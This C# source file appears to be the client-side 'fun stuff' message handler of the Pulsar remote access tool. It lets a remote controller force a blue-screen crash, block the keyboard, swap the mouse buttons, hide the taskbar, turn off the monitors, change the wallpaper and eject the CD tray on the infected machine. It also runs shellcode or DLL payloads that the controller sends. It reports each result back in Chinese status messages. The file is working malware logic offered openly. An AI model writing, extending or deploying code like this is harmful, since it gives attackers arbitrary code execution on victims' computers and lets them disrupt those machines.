using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Common.Messages.FunStuff;
using Pulsar.Common.Messages.Other;
using Pulsar.Client.FunStuff;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Pulsar.Client.Messages
{
    public class FunStuffHandler : IMessageProcessor, IDisposable
    {
        private BSOD _bsod = new BSOD();
        private SwapMouseButtons _swapMouseButtons = new SwapMouseButtons();
        private HideTaskbar _hideTaskbar = new HideTaskbar();
        private KeyboardInput _keyboardInput = new KeyboardInput();
        private CDTray _cdTray = new CDTray();
        private MonitorPower _monitorPower = new MonitorPower();
        private ShellcodeRunner _shellcodeRunner = new ShellcodeRunner();
        private DllRunner _dllRunner = new DllRunner(); // Added DLL runner

        public bool CanExecute(IMessage message) =>
            message is DoBSOD ||
            message is DoSwapMouseButtons ||
            message is DoHideTaskbar ||
            message is DoChangeWallpaper ||
            message is DoBlockKeyboardInput ||
            message is DoCDTray ||
            message is DoMonitorsOff ||
            message is DoSendBinFile;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoBSOD msg:
                    Execute(sender, msg);
                    break;
                case DoSwapMouseButtons msg:
                    Execute(sender, msg);
                    break;
                case DoHideTaskbar msg:
                    Execute(sender, msg);
                    break;
                case DoChangeWallpaper msg:
                    Execute(sender, msg);
                    break;
                case DoBlockKeyboardInput msg:
                    Execute(sender, msg);
                    break;
                case DoCDTray msg:
                    Execute(sender, msg);
                    break;
                case DoMonitorsOff msg:
                    Execute(sender, msg);
                    break;
                case DoSendBinFile msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoSendBinFile message)
        {
            try
            {
                // Determine if this is shellcode or DLL based on message properties or content
                if (IsDllPayload(message))
                {
                    _dllRunner.Handle(message, client);
                }
                else
                {
                    _shellcodeRunner.Handle(message, client);
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"执行二进制文件失败: {ex.Message}" });
            }
        }

        private bool IsDllPayload(DoSendBinFile message)
        {
            // You can implement logic here to determine if the payload is a DLL
            // Some possible approaches:

            // 1. Check file extension if available in message
            // if (!string.IsNullOrEmpty(message.FileName) && message.FileName.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            //     return true;

            // 2. Check for DLL signature (MZ header)
            if (message.Data?.Length > 1 && message.Data[0] == 0x4D && message.Data[1] == 0x5A)
                return true;

            // 3. Add a property to DoSendBinFile message type to specify payload type
            // return message.PayloadType == "dll";

            // For now, default to shellcode execution
            return false;
        }

        private void Execute(ISender client, DoCDTray message)
        {
            try
            {
                _cdTray.Handle(message);
                client.Send(new SetStatus { Message = $"CD 光驱已成功{(message.Open ? "弹出" : "关闭")}" });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"无法{(message.Open ? "弹出" : "关闭")} CD 光驱: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoMonitorsOff message)
        {
            try
            {
                _monitorPower.Handle(message);
                client.Send(new SetStatus { Message = $"显示器已成功{(message.Off ? "关闭" : message.On ? "开启" : "无操作")}" });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"切换显示器状态失败: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoBSOD message)
        {
            client.Send(new SetStatus { Message = "蓝屏成功" });
            _bsod.DOBSOD();
        }

        private void Execute(ISender client, DoSwapMouseButtons message)
        {
            try
            {
                SwapMouseButtons.SwapMouse();
                client.Send(new SetStatus { Message = "鼠标按键交换成功" });
            }
            catch
            {
                client.Send(new SetStatus { Message = "交换鼠标按键失败" });
            }
        }

        private void Execute(ISender client, DoHideTaskbar message)
        {
            try
            {
                client.Send(new SetStatus { Message = "隐藏任务栏成功" });
                HideTaskbar.DoHideTaskbar();
            }
            catch
            {
                client.Send(new SetStatus { Message = "隐藏任务栏失败" });
            }
        }

        private void Execute(ISender client, DoChangeWallpaper message)
        {
            try
            {
                string imagePath = SaveImageToFile(message.ImageData, message.ImageFormat);
                ChangeWallpaper.SetWallpaper(imagePath);
                client.Send(new SetStatus { Message = "更换壁纸成功" });
            }
            catch
            {
                client.Send(new SetStatus { Message = "更换壁纸失败" });
            }
        }

        private void Execute(ISender client, DoBlockKeyboardInput message)
        {
            try
            {
                _keyboardInput.Handle(message);
                client.Send(new SetStatus { Message = $"键盘输入已成功{(message.Block ? "屏蔽" : "解除屏蔽")}" });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"无法{(message.Block ? "屏蔽" : "解除屏蔽")} 键盘输入: {ex.Message}" });
            }
        }

        private string SaveImageToFile(byte[] imageData, string imageFormat)
        {
            string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper" + GetImageExtension(imageFormat));
            using (MemoryStream ms = new MemoryStream(imageData))
            {
                Image image = Image.FromStream(ms);
                image.Save(tempPath, GetImageFormat(imageFormat));
            }
            return tempPath;
        }

        private string GetImageExtension(string imageFormat)
        {
            switch (imageFormat?.ToLower())
            {
                case "jpeg":
                case "jpg":
                    return ".jpg";
                case "png":
                    return ".png";
                case "bmp":
                    return ".bmp";
                case "gif":
                    return ".gif";
                default:
                    return ".img";
            }
        }

        private ImageFormat GetImageFormat(string imageFormat)
        {
            switch (imageFormat?.ToLower())
            {
                case "jpeg":
                case "jpg":
                    return ImageFormat.Jpeg;
                case "png":
                    return ImageFormat.Png;
                case "bmp":
                    return ImageFormat.Bmp;
                case "gif":
                    return ImageFormat.Gif;
                default:
                    throw new NotSupportedException($"不支持图片格式 {imageFormat}。");
            }
        }

        #region IDisposable Implementation

        private bool _disposed = false;

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_disposed)
            {
                if (disposing)
                {
                    _keyboardInput?.Dispose();
                }
                _disposed = true;
            }
        }

        ~FunStuffHandler()
        {
            Dispose(false);
        }

        #endregion
    }
}